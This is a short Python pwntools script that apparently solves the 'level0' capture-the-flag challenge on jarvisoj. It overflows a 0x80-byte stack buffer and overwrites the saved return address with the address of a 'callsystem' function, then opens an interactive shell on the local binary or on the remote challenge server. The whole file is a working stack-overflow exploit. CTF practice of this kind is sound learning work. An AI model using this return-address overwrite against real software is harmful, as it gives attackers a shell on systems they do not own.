#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys

if sys.argv[1] == "l":
    io = process("./level0")
else:
    io = remote("pwn2.jarvisoj.com", 9881)

payload = '0' * (0x80 + 0x8) + p64(ELF("./level0").sym['callsystem'])
io.sendafter("World\n", payload)

io.interactive()
